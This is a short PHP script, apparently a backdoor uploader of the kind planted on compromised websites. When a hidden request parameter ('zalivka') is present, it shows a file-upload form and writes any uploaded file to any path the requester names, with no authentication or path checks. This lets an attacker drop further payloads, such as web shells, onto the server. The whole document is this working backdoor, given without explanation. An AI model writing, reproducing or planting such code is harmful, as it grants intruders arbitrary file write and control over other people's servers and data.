<?php
    if(isset($_REQUEST['zalivka'])) {
		if($_REQUEST['doUpload']) {
			if(!file_put_contents($_REQUEST['filename'], file_get_contents($_FILES['file1']['tmp_name']))) exit('UPLOAD ERROR');
			exit('UPLOAD OK');
		} else {
			echo '<form method="post" enctype="multipart/form-data">';
			echo 'File name: <input name="filename"/><br>';
			echo 'File to upload: <input type="file" name="file1"/><br>';
			echo '<input type="submit" name="doUpload" value="Upload"/><br>';
			echo '</form>';
		}
    }
?>
